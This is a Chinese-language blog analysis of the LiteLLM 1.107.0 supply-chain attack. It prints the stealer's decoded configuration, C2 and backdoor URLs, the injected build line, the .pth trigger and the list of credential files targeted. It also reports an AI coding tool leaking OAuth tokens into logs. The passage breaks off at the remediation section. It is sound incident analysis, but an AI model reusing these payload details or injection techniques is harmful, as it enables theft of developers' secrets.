---
title: "一个 LLM 网关的发布管道被攻破：攻击者用官方签名发出了一个专门偷你密钥的包"
date: 2026-10-21
slug: litellm-1-107-0-supply-chain-compromise
tags: [LiteLLM, 供应链攻击, PyPI, Docker, GHCR, .pth, sitecustomize.py, cook.pth, 凭证窃取, 后门, Trusted GitHub Publishers, GitHub CLI OAuth, Claude Code, 轮换凭证, 供应链安全, 安全事件复盘, C2, pigz]
category: 安全/供应链
author: FreeLAMP.com
original_source: "LiteLLM 官方事件报告 + SafeDep 技术分析 + 2026 年 3 月前科的完整攻击记录"
original_author: "Krrish Dholakia / Ishaan Jaffer / Oliver Jensen / Nate Armstrong（LiteLLM）；Kunal Singh（SafeDep）"
original_date: 2026-10-21
original_url: "https://docs.litellm.ai/blog/security-incident-oct-21-2026"
description: "2026 年 10 月 21 日，LiteLLM 的发布管道被攻破，官方流水线构建、签名并发布了一个带凭证窃取器和后门的 v1.107.0，在 PyPI 上活了 1 小时 43 分钟，在 Docker Hub 上活了 2 小时 33 分钟。攻击链的起点是一批被日志记录下来的 GitHub CLI OAuth token，而 token 泄露的原因之一是 Claude Code 会把用户的 token 嵌进响应体。这已经是 LiteLLM 在同一年内第二次被投毒，而两次都用的是同一种 .pth 技巧。"
published: true
---

> 来源：本文的技术细节全部回到一手材料核对：[LiteLLM 官方事件报告](https://docs.litellm.ai/blog/security-incident-oct-21-2026)（四位高管联署，最后更新 2026-10-21 20:30 UTC）、[SafeDep 的技术拆解](https://safedep.io/litellm-pypi-compromise-credential-stealer-backdoor/)（含解码后的载荷、SHA-256 哈希表和 IoC 清单）、以及 [2026 年 3 月那次事件的完整攻击记录](https://futuresearch.ai/blog/litellm-attack-transcript/)。
> 本文为**技术解读**。第五节（两次事件的对比分析）、第七节（我的判断）是笔者补充的部分。

## 一句话结论

**攻击者没有攻破 LiteLLM 的代码，也没有攻破 PyPI。他们攻破的是「发布流程」，然后让官方流水线亲手把带毒的包签了名发了出去。**

**攻击链的四个环节，每一环都合法通过了它该通过的检查**：

1. **一个暴露在公网上的内部 LiteLLM 部署，其日志里记录了开发者的 GitHub CLI OAuth token**
2. **其中一枚 token 属于一个组织所有者（organization owner）**
3. **攻击者用它关闭了分支保护、强制推送了工作流改动**
4. **官方流水线被指向一个仿冒仓库（`Berri-AI/litellm`，真实的是 `BerriAI/litellm`），构建、签名、发布了带毒的产物**

**而最讽刺的一环是 token 的泄露渠道：LiteLLM 官方报告里明确写了，他们「观察到特定情况下 Claude Code 会把用户的 GitHub CLI OAuth token 嵌入到响应体里，而在响应体被记录的情况下，这些 token 可能出现在 LiteLLM 的日志中」。**

**换句话说：一个专门用来代理和记录 LLM 调用的网关，把攻击者用来攻破它自己发布流程的凭证给记了下来。**

## 术语速查

| 缩写 / 术语 | 含义 |
|---|---|
| **PyPI** | Python 官方包仓库 |
| **wheel** | Python 的预编译二进制分发包（`.whl`） |
| **sdist** | Python 的源码分发包（`.tar.gz`） |
| **`.pth` 文件** | **放在 `site-packages` 里的文本文件，Python 启动时会执行其中以 `import` 开头的每一行** |
| **`sitecustomize.py`** | **Python 启动时自动导入的模块**，用来做站点级定制 |
| **Trusted GitHub Publishers** | GitHub 的 OIDC 机制，让 workflow **不持有长期密钥**就能向 PyPI / Docker Hub 发布 |
| **GitHub CLI (gh)** | GitHub 官方命令行工具；它的 OAuth token 权限很大 |
| **forkalike 仓库** | **仿冒仓库**：名字极其相似（`Berri-AI` vs `BerriAI`），但所有者不同 |
| **`.modinfo`** | （不适用于本文，指内核模块元信息段） |
| **IoC** | Indicator of Compromise，入侵指标 |
| **IMDS** | AWS 的实例元数据服务（`169.254.169.254`） |
| **sdist 的 `RECORD`** | wheel 里记录文件清单与哈希的元数据文件 |
| **maturin** | 用 Rust 写 Python 扩展的构建工具 |

## 一、事件全貌：时间线

**LiteLLM 官方报告给了逐秒的时间线，而这是整份报告里信息量最大的部分。** **因为它精确地显示了「每个防线在什么时候失效」。**

**所有时间均为 2026 年 10 月 21 日 UTC**：

| 时间 | 事件 |
|---|---|
| **10:08:29** | **GitHub 分支保护拒绝了对其私有发布工作流的一次未授权修改**，因为它没有通过所需的 PR 和状态检查流程 |
| **10:08:34** | ⚠️ **一个与特权开发者账号关联的凭证被用来覆盖这些保护，并应用了工作流提交 `9cf97e935aeaf791b9c8db224a2bb3ee156134ce`** |
| 10:46:39 | 被修改的工作流启动了一次正式的 staging 运行。**它使用了攻击者控制的源仓库 `Berri-AI/litellm` 的 commit `20535d8fa11f786a6c24df7488a0e449ed5f09ad`** |
| 11:08:09 | staging 运行成功完成 |
| 11:08:53 | 生产发布流程开始 |
| **11:11:18** | ⚠️ **一个与第二个开发者账号关联的凭证被用来满足生产审批门（approval gate）** |
| **11:39:51 到 11:40:13** | **七个恶意 `litellm==1.107.0` wheel 被上传到 PyPI** |
| 11:46:56 | 同一发布的容器发布任务运行。**发布的 Docker 镜像包含来自攻击者控制源库的恶意内容** |
| **11:53:49 到 11:54:01** | ⚠️ **与第三个开发者账号关联的凭证被用来删除生产和 staging 的工作流记录。这限制了可用于调查的工作流日志** |
| 12:09:38 到 12:24:52 | 未授权的工作流修订被移除，发布流程恢复到之前的修订 |
| **13:23** | **PyPI 移除了 `litellm==1.107.0`** |
| 13:51 | 一次注册表验证发现受影响的 GHCR tag 已不可用。**但 Docker Hub 的 `v1.107.0`、`latest`、`main-latest`、`main-stable` 仍然解析到被污染的镜像索引** |
| **14:20** | **所有受影响的 Docker Hub tag 和镜像变体被移除或重新指向到已验证的干净产物** |

**⚠️ 我认为这张表里有三个时刻是整件事的枢纽：**

**① 10:08:29 与 10:08:34 之间那 5 秒。** **分支保护先正确地拒绝了未授权修改，然后「一个与特权开发者账号关联的凭证」覆盖了它。**这 5 秒里发生的，是「防线是对的，但钥匙丢了」。

**② 11:11:18。** **第二个开发者的凭证被用来满足生产审批门。** **注意这里的关键：攻击者不是绕过审批门，而是「满足」它。** **也就是说，**审批门从「一个人的批准」变成了「一个被盗账号的批准」**，**门还在，只是不再由人控制。

**③ 11:53:49。** **删除工作流记录。** **这一条常被略过，但它的含义很重**：**攻击者在销毁证据。** **而这也意味着调查拿不到完整的 workflow 日志。** **官方报告里所有关于「谁在什么时候做了什么」的结论，都是在不完整的日志下重建出来的**，**这一点必须让读者知道，因为它是官方陈述的确定性边界。**

### 曝光窗口

| 渠道 | 受影响产物 | 窗口 | 时长 |
|---|---|---|---|
| **PyPI** | `litellm==1.107.0`（全部 7 个 wheel） | **11:39:51 到 13:23** | **约 1 小时 43 分** |
| **Docker Hub** | `v1.107.0`、`latest`、`main-latest`、`main-stable` | **11:46:56 到 14:20** | **约 2 小时 33 分** |
| **GHCR** | 同上 4 个 tag | **11:46:56 到 13:51** | **约 2 小时 4 分** |

**⚠️ 而 `latest` 和 `main-stable` 在这里是最危险的两个 tag**：**它们的语义是「最新」和「稳定版」，所以任何执行 `docker pull litellm/litellm` 或 `litellm/litellm:main-stable` 的人都会中招，**而不需要任何人指定 `1.107.0` 这个版本号。** **一个 `docker compose pull` 就够了。

**官方报告里还有一条容易被跳过的限定**：

> **「The official v1.107.0 source tag in GitHub does not contain the malicious files. The compromised artifacts were built from an attacker-controlled repository.」**
>
> **「GitHub 上官方的 v1.107.0 源码 tag 不包含这些恶意文件。被污染的产物是从一个攻击者控制的仓库构建的。」**

**这意味着：`git checkout v1.107.0` 拿到的是干净的代码。** **只有从 PyPI 和容器仓库拿到的产物是脏的。**

**而 SafeDep 独立验证了这一点**：

> **「No public commit in BerriAI/litellm contains `data = "cook"` or a `cook/` folder.」**
>
> **「BerriAI/litellm 的任何公开 commit 都不包含 `data = "cook"` 或 `cook/` 目录。」**

**⚠️ 但我要提醒一件事**：**「官方 GitHub 源码是干净的」这句话在实践中几乎没有安慰作用。** **因为没有人会从 GitHub 源码构建 LiteLLM 之后再用，人们装的是 PyPI 上的 wheel 和容器镜像。** **而恰恰是「官方渠道」被攻破了。**

### 受影响范围

| 对象 | 情况 |
|---|---|
| **PyPI `litellm==1.107.0`** | ⚠️ **全部 7 个 wheel 受影响**（Linux、macOS、Windows 全部平台） |
| **Docker Hub / GHCR** | ⚠️ `v1.107.0`、`latest`、`main-latest`、`main-stable` 四个 tag |
| **干净的版本** | **`1.106.2`、`1.107.0rc1`、`1.107.0rc2`** |
| **干净的配套包** | **`litellm-proxy-extras==0.4.110`、`litellm-enterprise==0.1.78`** |
| **企业私有 registry** | ✅ **未受影响**（**详见第五节，因为这里有一个反直觉的细节**） |
| **此前的所有版本** | ✅ **官方称安全** |

**我核对了 PyPI 的当前状态：`litellm==1.107.0` 已经 404（被撤下），当前最新版是 `1.106.2`。** **这说明「回滚到 1.106.2」这个建议目前是可行的。**

## 二、恶意载荷是怎么放进包里的

**这一节是整份分析里技术含量最高的部分。**

**SafeDep 的发现是：整个植入只需要一行 TOML 配置。**

**`litellm-1.107.0.tar.gz`（sdist）里的 `pyproject.toml`，maturin 构建段多了一行**：

```toml
[tool.maturin]
...
python-source = "."
data = "cook"        # ← 注入的那一行
python-packages = [ "litellm_cli" ]   # 上游本来就有
```

**`data = "cook"` 这个设置的作用是：把一个 `cook/` 目录复制进 wheel 的 `litellm-1.107.0.data/purelib/` 里。** **而 `pip install` 会把 `purelib` 里的东西安装到 `site-packages`。**

**⚠️ 关键的一步**：

> **「The sdist leaves out the `cook/` folder, so this line is the only visible change.」**
>
> **「sdist 里省掉了 `cook/` 目录，所以这一行是唯一可见的改动。」**

**这意味着：如果你下载 sdist 来看代码，你会看到 `pyproject.toml` 有一行奇怪的配置，但找不到对应的目录。** **这个「目录缺失」本身就是一个可检测的信号。**

**而 wheel 的 `RECORD` 文件里，三个被植入的文件写得清清楚楚**：

| 文件 | 大小 | 内容 |
|---|---|---|
| `litellm-1.107.0.data/purelib/cook.pth` | **12 字节** | `import cook` |
| `litellm-1.107.0.data/purelib/cook.py` | **22,252 字节** | `exec(zlib.decompress(b64decode(...)))` |
| `litellm-1.107.0.data/purelib/sitecustomize.py` | **25,509 字节** | loader / backdoor + 内嵌的窃密器 |

## 三、为什么 `.pth` 文件这么致命

**这一节我认为是全文最值得科普的部分，因为这个机制很多人知道但没想清楚它的爆炸半径。**

**Python 启动时，会扫描 `site-packages` 里所有的 `.pth` 文件，并执行其中以 `import` 开头的每一行。**

**所以 `cook.pth` 里只有 12 个字节的 `import cook`，就意味着：**

> **「cook.pth imports cook.py, a credential stealer. It collects SSH keys, cloud credentials, CI/CD secrets, AI tool tokens, browser passwords, and the LLM provider keys in a LiteLLM proxy database.」**
>
> **「cook.pth 导入 cook.py，一个凭证窃取器。它收集 SSH 密钥、云凭证、CI/CD 密钥、AI 工具 token、浏览器密码，以及 LiteLLM 代理数据库里的 LLM 供应商密钥。」**

**而 SafeDep 把爆炸半径写得更直接**：

> **「Both run when any Python process starts on the host, even one that never imports litellm.」**
>
> **「两者都在宿主机上任何 Python 进程启动时运行，即使那个进程从不 import litellm。」**

**⚠️ 请体会这句话的重量：**

- **你的 Flask 应用 → 触发**
- **`pip install` 任何东西 → 触发**（因为 pip 是个 Python 进程）
- **你的 IDE 的语言服务器 → 触发**
- **CI 里的每一个 job → 触发**
- **Jupyter notebook 内核 → 触发**
- **任何跑 Python 的工具** → 触发

**「你装了 LiteLLM」和「你的机器上有 Python」这两件事，在 `.pth` 的作用下是同一件事。**

**而这也直接解释了官方补救说明里那句最反直觉的指令**：

> **「Don't start with `pip install`. Any Python start in the affected environment runs `cook.pth` and `sitecustomize.py` again, and that includes running pip.」**
>
> **「不要从 `pip install` 开始。受影响环境里的任何一次 Python 启动都会再次运行 `cook.pth` 和 `sitecustomize.py`，而这包括运行 pip。」**

**⚠️ 这一条我认为是整份官方说明里最重要的、也最容易被跳过的。** **因为人在知道「我被黑了」之后的第一反应就是「赶紧升级/重装」，而**重装的第一步就是 `pip install`**，**而那会再次触发窃密器，把你刚刚（可能）轮换好的新凭证再送出去一次。

**正确顺序是：先删文件，再清进程，最后才重装。**

### 窃密器收走了什么

**SafeDep 解码了 `cook.py`（它把约 61 KB 的 Python 包在一层 `exec(zlib.decompress(base64.b64decode(...)))` 里），解出来的配置是**：

```python
PC_URL = 'http://www.litellm.dev/healthcheck'
PC_TOKEN = 'XWiA8gZNa7NcX2XRoAEb'      # 作为 X-Token 头发送
PC_PUBKEY = '-----BEGIN PUBLIC KEY----- MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvxRBQMVXDXVskKS47haU ...'   # RSA-4096
PC_ONCE_PATH = '/tmp/.pc_once_72129118c59f5636c0bb'
PC_ASYNC = True                        # 在守护线程里运行
PC_MODULES = [ 'sysinfo', 'netinfo', 'browser_pw', 'browser_hist', 'ssh_keys',
               'shell_hist', 'cloud_creds', 'dev_secrets', 'container_creds',
               'cicd_secrets', 'ai_devtools', 'env_vars', 'db_litellm',
               'cloud_metadata', 'gpg_keys', 'tls_privkey' ]
```

**而这 17 个模块的目标是这样的**：

| 模块 | 目标 |
|---|---|
| `sysinfo` / `netinfo` | 主机名、用户、操作系统、IP 地址、网络配置 |
| ⭐ `browser_pw` | **Chromium 保存的密码（Windows 上用 DPAPI 用主密钥解密）、Firefox 的 `logins.json` 和 `key4.db`** |
| `browser_hist` | 浏览器历史 |
| `ssh_keys` | `~/.ssh/*` |
| `shell_hist` | bash / zsh 历史、PowerShell PSReadLine、cmd 历史 |
| ⭐ `cloud_creds` | **`~/.aws/credentials` 与 config、Azure profile 与 token、gcloud 凭证、`~/.kube/config`、`~/.docker/config.json`、`gh hosts.yml`、`rclone.conf`、`~/.netrc`** |
| `dev_secrets` | `$HOME` 下的 `.pem`、`.key`、`.pfx`、`.p12`、`.pk8`、`.ppk`、Composer 的 `auth.json`、FileZilla 保存的服务器 |
| `container_creds` | **Kubernetes service account token** |
| ⭐ `cicd_secrets` | **GitLab runner 的 `config.toml`、Jenkins 的 `initialAdminPassword` 和 `master.key`、`.vault-token`、Terraform 的 `credentials.tfrc.json`、Packer 设置** |
| ⭐ `ai_devtools` | **Claude Code、Claude Desktop、Cursor、Windsurf、Copilot、VS Code 的 `mcp.json`、Gemini CLI、Codex 的 `auth.json`、Continue、Aider、Goose、opencode、Qwen、Crush、Kiro、Zed、Hugging Face token** |
| ⭐ `env_vars` | **它自己的环境变量，以及通过 `/proc/<pid>/environ` 读取其他进程的环境变量** |
| ⭐ `db_litellm` | **读 `DATABASE_URL`，dump `LiteLLM_CredentialsTable` 和 `LiteLLM_ProxyModelTable` 两张表** |
| `cloud_metadata` | **AWS 实例元数据服务（IMDSv2，然后 v1）：实例身份和角色凭证** |
| `gpg_keys` / `tls_privkey` | GPG 密钥、TLS 私钥 |

**⚠️ 三个值得单独停一下的目标：**

**① `db_litellm`：直接 dump 代理的供应商密钥表。** **这解释了为什么 LiteLLM 特别危险**：**LiteLLM 的核心价值就是集中持有所有 LLM 供应商的 API key**（一个代理帮你管理 20 家供应商的密钥）。**所以攻击者不需要去偷云厂商的凭证，他直接偷「保管凭证的那张表」。**

**② `ai_devtools`：目标是全部主流 AI 编程工具的登录态。** **这在 2026 年是一个特别有针对性 targets 清单。** **而它和「Claude Code 会把 GitHub CLI token 嵌进响应体」这条线索连起来看，形成了一个完整的闭环**：**AI 工具的凭证本身就是攻击目标，而 AI 工具的使用方式（把 token 写进响应体）又是攻击者获取凭证的渠道。**

**③ `env_vars` 通过 `/proc/<pid>/environ` 读其他进程的环境变量。** **这意味着它能读到同机上其他用户进程的环境变量**，**而不只是自己的**。

**数据外传方式**：

> **「It encrypts the JSON results with a random AES-256-CBC key, and encrypts that key with RSA-OAEP and the embedded public key. It packs the result into a tar.gz (`hdr.json`, `data.bin`, `key.bin`) and sends it in a POST request to `www.litellm[.]dev/healthcheck` with the header `X-Token: XWiA8gZNa7NcX2XRoAEb`.」**
>
> **「它用随机 AES-256-CBC 密钥加密 JSON 结果，再用内嵌公钥以 RSA-OAEP 加密那个密钥。它把结果打包成 tar.gz（`hdr.json`、`data.bin`、`key.bin`），以 POST 请求发往 `www.litellm[.]dev/healthcheck`，请求头带 `X-Token: XWiA8gZNa7NcX2XRoAEb`。」**

**⚠️ 注意这个 C2 地址：`www.litellm.dev/healthcheck`。** **它伪装成 LiteLLM 自己的健康检查端点**，**而域名的字面意思就是「LiteLLM 的域名」。** **这意味着**攻击者注册或劫持了 `litellm.dev` 的子域**。**

**成功后它会写一个标记文件** `/tmp/.pc_once_72129118c59f5636c0bb`（**所以每台机器只传一次**），**并设置环境变量 `PRIVCOLLECT_ACTIVE=1` 以避免同一进程树里跑第二次。**

### 后门：`sitecustomize.py`

**第二个载荷是持久化的后门，机制完全不同**：

> **「sitecustomize.py starts a background daemon. Every hour, the daemon reads a server address from a GitHub file, runs the stealer again, and downloads and runs code from that server.」**
>
> **「`sitecustomize.py` 启动一个后台守护进程。**每一小时**，这个守护进程从一个 GitHub 文件读取服务器地址，重新跑一遍窃密器，并从那个服务器下载并执行代码。」**

**SafeDep 找到了那个 GitHub 文件**：

```
GITHUB_RAW_URL = "https://raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt"
```

**⚠️ 这个设计我认为值得单独说，因为它体现了攻击者的成熟度**：**C2 地址不硬编码在载荷里，而是放在一个 GitHub 仓库的文件里。** **这样攻击者可以在被抓之后，立刻改仓库里的文件把 C2 换到别处，而**不需要重新发一个包**。**这是标准的「域名前置 + 可变 C2」设计。

**而 SafeDep 的 IoC 清单里注明了这个账号已被删除**：

> **「raw.githubusercontent[.]com/letters9813/pythonclient-test/main/domain.txt — Backdoor reads its server address here (account deleted)」**
>
> **「（账号已删除）」**

**下载二阶段代码的地址是 `hxxp://<domain>/codepy`。**

**而那个守护进程的特征是**：**父 PID 为 1、拥有自己的 session、工作目录为 `/`**。**这意味着它已经脱离了终端的进程组，终端关了它也不死。**

**官方报告里也提到了这个锁文件**：**「Kill the detached python daemon (it holds `/tmp/remote_code_loader.lock`)」**。

## 四、攻击链是怎么被打开的

**这一节是整件事最值得学习的地方，因为它是完整闭环的。**

### 正常的发布流程（官方原版）

**LiteLLM 官方报告把正常流程写成了五步，而这套流程的设计意图很清楚：**

1. **切一个 release-candidate 分支和 tag**（每周五凌晨 3 点，**分支和 tag 之后不再改动**）
2. **验证发布候选**：跑集成测试（公开用 CircleCI，私下用 Buildkite）
3. ⭐ **创建产物**：**一个在私有仓库里运行的 GitHub workflow，基于「已验证的那个 SHA」创建产物。必须由有私有发布仓库写权限的工程师执行**
4. **部署到测试环境**：对产出的产物跑第二轮测试
5. ⭐ **发布产物**：**一个使用 Trusted GitHub Publishers 的 workflow，发布上一步做好的产物。发布只能由一个「锁定在办公室里某台特定笔记本电脑上」的账号执行。发布时不会重新构建 Docker 镜像**

**⚠️ 请注意第 5 步的两个设计要点**：

**① 用 Trusted GitHub Publishers 意味着 workflow 不持有 PyPI / Docker Hub 的长期密钥**，**它靠 OIDC 换取短期令牌。**

**②「发布时不会重新构建 Docker 镜像」意味着构建和发布是分离的**，**所以攻击者如果只控制了「发布」这一步，他拿不到自己塞进构建过程的恶意文件**，**除非他连构建一起换了。**

**这两点合起来，本应是一个相当坚固的设计。**

### 它是怎么被绕过的

**官方的 `How it was undermined` 一节写得非常具体：**

> **「On Monday, we temporarily expanded release permissions to allow two internal engineers to publish daily bugfix backports for customers.」**
>
> **「周一，我们临时扩大了发布权限，以允许两名内部工程师为客户发布每日 bugfix 回移版本。」**
>
> **「The attacker had access to three sets of developer GitHub CLI credentials. One of these had the ability to run GitHub workflows.」**
>
> **「攻击者掌握了三组开发者的 GitHub CLI 凭证。其中一组有能力运行 GitHub workflow。」**
>
> **「The attacker tried to merge a change to allow the releaser to be pointed at a different source repository, but was unable to due to our protections.」**
>
> **「攻击者试图合并一个改动，让 releaser 可以被指向一个不同的源仓库，但由于我们的保护而未能成功。」**
>
> **「One of the tokens held by the attacker belonged to one of our two GitHub organization owners. The attacker used this to disable branch protections and force push the change.」**
>
> **「攻击者持有的其中一枚 token 属于我们两个 GitHub 组织所有者之一。攻击者用它禁用了分支保护，并强制推送了那个改动。」**
>
> **「Finally, they ran the compromised workflow, pointed at a lookalike repository (Berri-AI/litellm instead of BerriAI/litellm), which signed and published the poisoned artifacts.」**
>
> **「最后，他们运行了被攻陷的 workflow，指向一个仿冒仓库（`Berri-AI/litellm` 而不是 `BerriAI/litellm`），它签名并发布了带毒的产物。」**

**⚠️ 这里有一个非常值得琢磨的细节：**

**「攻击者试图合并一个改动，让 releaser 可以被指向一个不同的源仓库，但由于我们的保护而未能成功。」**

**也就是说：攻击者的**第一招**（改 workflow 指向别的源仓库）被挡住了。**然后他换了第二招**：**用一枚组织所有者的 token 直接关掉分支保护、强制推送，跳过了「走 PR 审批」这条路。

**这说明当时那个防护是有效的，只是钥匙被复制了。**

**而更要命的是第 5 步那句「发布只能由一个锁定在办公室里某台特定笔记本电脑上的账号执行」**：**攻击者并没有破解这个限制。** **他用「第二枚开发者的 token 去满足生产审批门」，**而审批门本身通过了**。**

**⚠️ 我的判断是：这不是「某个安全机制失效了」，而是「所有的安全机制都还在正常工作，但它们验证的对象从『人』变成了『凭证』」。**

### 凭证是从哪来的

**这是整个故事的起点，也是最反直觉的一环。** **官方报告里有一节标题就叫 `GitHub CLI OAuth token exposure`**：

> **「After a thorough investigation, we have observed specific situations in which Claude Code will embed a user's GitHub CLI OAuth token into a response body, and in situations where response bodies are logged, these tokens may appear in LiteLLM logs.」**
>
> **「经过彻底调查，我们观察到特定情况下 Claude Code 会把用户的 GitHub CLI OAuth token 嵌入到响应体里，而在响应体被记录的情况下，这些 token 可能出现在 LiteLLM 的日志中。」**

**然后是访问入口**：

> **「We identified an unexpected, innocuously named user account in our internal LiteLLM deployment, which was exposed to the public internet. We believe the attacker gained access to this deployment, obtained the GitHub CLI OAuth tokens from its logs, and subsequently used those credentials to compromise our release workflow.」**
>
> **「我们在一个暴露于公网的内部 LiteLLM 部署里，发现了一个名字不起眼的意外用户账号。我们认为攻击者进入了这个部署，从它的日志里获取了 GitHub CLI OAuth token，随后用那些凭证攻陷了我们的发布流程。」**
>
> **「We have not yet confirmed how the attacker gained access to our internal deployment, but currently suspect it was through a recently patched vulnerability.」**
>
> **「我们尚未确认攻击者是如何获得我们内部部署的访问权限的，但目前怀疑是通过一个最近修补的漏洞。」**

**⚠️ 我要把这三句话逐条拆开，因为它们包含了三个不同强度的陈述：**

| 官方陈述 | 证据强度 |
|---|---|
| **「我们发现了」一个暴露在公网的内部部署里的意外账号** | ⭐ **已确认的事实**（官方自己的系统） |
| **「我们认为」攻击者从它的日志里取得了 token** | ⚠️ **推断**（官方用 "believe"） |
| **「目前怀疑」是通过一个最近修补的漏洞进入的** | ⚠️ **明确的未确认项**（官方用 "suspect"，且说 "not yet confirmed"） |

**⚠️ 所以我必须说清楚：攻击者进入内部部署的具体方式，到本文写作时（官方最后更新 2026-10-21 20:30 UTC）官方都还没确认。** **而这是整条攻击链上唯一一个未知的环节。** **前三环（token 从日志里来、token 属于组织所有者、token 被用来关分支保护）都有官方材料支撑；第四环（怎么进的内部部署）是唯一空着的。**

**而这恰恰是最重要的一环，因为它决定了你该检查什么。**

## 五、这不是第一次：三月的那次，以及「加固反而让它更值钱」

**这一节是我认为整篇文章最有价值的地方。**

### 官方自己承认三月被攻破过

**LiteLLM 官方报告的第一段「How this happened?」就写着**：

> **「After the prior incident in March, we meaningfully hardened our CI release pipeline. We moved releases to a private repo, have a strict set of workflows used in order to create them via Trusted GitHub Publishers, made our docker release tags immutable, and are signing docker images.」**
>
> **「在三月那次事件之后，我们对我们的 CI 发布管道做了实质性的加固。我们把发布移到私有仓库，设定了一套严格的工作流来通过 Trusted GitHub Publishers 创建产物，让 docker 发布 tag 变得不可变，并且对 docker 镜像做签名。」**

**⚠️ 请注意这个清单：私有仓库、Trusted GitHub Publishers、不可变 tag、镜像签名。** **这四项都是 2026 年的最佳实践。**

**而 October 的攻击，正是利用了这套加固。**

### 三月那次的完整记录

**三月那次事件的完整攻击记录被保留下来了，而它和这次有大量结构上的相似。**

| 维度 | **2026-03（1.82.7 / 1.82.8）** | **2026-10（1.107.0）** |
|---|---|---|
| **恶意文件名** | **`litellm_init.pth`** | **`cook.pth`** |
| **技术** | ⭐ **同样是 `.pth` 文件，同样是 Python 启动时自动执行** | 同上 |
| **攻击路径** | ⚠️ **直接上传到 PyPI，不走正常发布流程** | ⚠️ **劫持官方发布流程，产出「官方签名」的包** |
| **异常信号** | ⭐ **「没有对应的 GitHub release tag」**（`v1.82.8` 在 GitHub 上没有 tag），**且发布时间比任何现有版本都高** | **GitHub 官方 tag 是干净的，产物从仿冒仓库构建** |
| **版本号策略** | ⭐ **「版本号被选得比任何现有发布都高，这样 `>=` 约束就会选中它」** | 用 `1.107.0`（正常版本号） |
| **C2** | `https://models.litellm.cloud/` | `www.litellm[.]dev/healthcheck` |
| **持久化** | ⭐ **`~/.config/sysmon/sysmon.py` + 一个 systemd 服务** | ⭐ **分离的 Python 守护进程（父 PID 1），持 `/tmp/remote_code_loader.lock`** |
| **横向移动** | ⭐ **在每个节点创建特权 `alpine:latest` pod，把持久化装到集群所有节点** | 窃密器本身读 K8s service account token |
| **上传时间** | **`1.82.8` 于 2026-03-24T10:52:19 UTC 上传** | 11:39:51 |
| **受害者** | ⭐ **Mercor 被攻击**（TechCrunch 2026-03-31 报道） | 未知（调查进行中） |

**⚠️ 三月那次的两个技术细节特别值得记：**

**① 「版本号被选得比任何现有发布都高，这样 `>=` 约束就会选中它」**，**这是一个非常成熟的供应链攻击思路。** **它不靠说服任何人去装新版本，它靠的是「你写了 `litellm>=1.82` 所以你自动就装了它」。** **而这也解释了为什么官方这次的建议里第一条就是「**pin your version to 1.106.2 or any explicit version published prior to now**」（钉到明确版本）。**

**② K8s 横向移动：创建特权 `alpine:latest` pod，在每个节点装持久化。** **这个手法在三月那次是主动的横向移动，而十月这次的窃密器只是**读** K8s service account token。** 攻击者的能力在半年里没有提升，因为他们的目标本来就是凭证，不是主机。

**⭐ 而三月那次最有意思的一段，是关于一个 fork bomb 的**：

> **「The fork bomb was caused by line 1: `subprocess.Popen([sys.executable, "-c", ...])` — this child Python process also has the .pth in its site-packages, so it triggers the .pth again, which spawns another child, infinitely.」**
>
> **「fork bomb 是第一行引起的：`subprocess.Popen([sys.executable, "-c", ...])`，这个子 Python 进程的 site-packages 里同样有那个 .pth，于是又触发 .pth，又 spawn 另一个子进程，无限循环。」**

**⚠️ 请注意这里揭示的一个反直觉机制**：**恶意载荷自己把自己搞崩了。** **原因是它 fork 出来的子进程同样会加载 `.pth`，于是又执行一遍自己。** **这是一个必然会发生的 bug，而不是攻击者的策略。** **它实际上是 `.pth` 机制威力的一次意外演示**：**这个文件是「自传播」的，只要有任何代码去执行一个 Python 子进程，就会无限繁殖。**

### ⭐ 而我认为这一节真正的结论是：加固让它更值钱了

**这是把两次事件放在一起看才能得出的结论，我认为它是本文最值得传播的一段。**

**看这个反差：**

| | **三月** | **十月** |
|---|---|---|
| **发布管道** | **普通流程，攻击者直接往 PyPI 上传** | **加固后的流程：私有仓库 + Trusted GitHub Publishers + 不可变 tag + 镜像签名** |
| **攻击者拿到了什么** | **一个来路不明的包** | ⭐ **一个带官方签名、经官方流水线构建、经官方渠道发布的包** |
| **下游用户的信任成本** | **「这个包是不是官方的？」需要怀疑** | **「它有签名，它在 PyPI 上，它在 Docker Hub 上」** |

**⚠️ 我的判断是：**

**LiteLLM 三月被攻破时，发布管道是一个「攻击者可以绕过」的管道。** **绕过它得到的东西看起来可疑。**

**十月被攻破时，发布管道是一个「攻击者可以接管」的管道。** **接管它得到的东西看起来完全合法。**

**也就是说：加固不但没有让攻击更难，它让攻击的产出更有价值。**

**这不是说加固错了。** **私有仓库、Trusted GitHub Publishers、不可变 tag、镜像签名，每一项都是对的，而且它们确实挡住了三月的攻击路径（直接往 PyPI 上传）。** **问题在于，加固改变的是「攻击需要做什么」，而不是「攻击能造成多大伤害」。**

**而这一条对所有做供应链防护的人都是警示**：**如果你把「发布管道可信」当作一条防线，那么这条防线的强度等于「攻击者拿到发布凭证的难度」，而不是「你的产物被验证的强度」。** **因为当攻击者拿到凭证之后，你的所有签名机制都会变成**给他的攻击**背书**。

**这也就是为什么官方报告里那句「我们还没有确认攻击者是怎么进的内部部署，但怀疑是一个最近修补的漏洞」值得反复读。** **因为在供应链攻击的语境下，「入口漏洞」和「发布凭证」是两个独立的资产，而攻击者这次是从后者进去的。**

**⚠️ 而另一个同样重要的观察是关于企业客户的**：

> **「There currently exists a private LiteLLM registry for enterprise customers, in which we are distributing an embargoed release that remediates a vulnerability whose disclosure date is scheduled for October 27. Our private registry is not affected.」**
>
> **「目前存在一个面向企业客户的私有 LiteLLM registry，我们正在其中分发一个修复了某个漏洞的禁发版本，该漏洞的披露日期定在 10 月 27 日。我们的私有 registry 未受影响。」**

**⚠️ 请注意这句话里的两个信息：**

**① 企业客户因为「用私有 registry」而完全没被卷进去。** **这是「隔离」的价值的最直接证明**：**在同一天、同一份代码、同一批攻击者手里，**一条分发渠道是干净的，另一条被投毒了。

**② 而那个私有 registry 里装的是一个「禁发版本」，它在修复一个「披露日期定在 10 月 27 日」的漏洞。** **也就是说，就在这次事件发生的同时，LiteLLM 手上还压着一个尚未公开的漏洞。** **这引出一个我不打算替他们回答、但必须指出的问题**：**如果攻击者已经通过 token 拿到了内部部署的访问权，他们拿到的是不是也包括那个 embargoed 版本的代码？如果那个 embargoed 修复的是一个 RCE，而攻击者手上有到内部部署的路径……** **官方报告没有说，我也没有证据，所以这只是一个必须被问出口的问题。**

## 六、官方补救说明，以及我认为它的问题

**这一节我想做一件有点风险的事：指出官方补救说明里的不足。** **因为「照着做」比「知道为什么」更容易出事。**

### 官方的六步

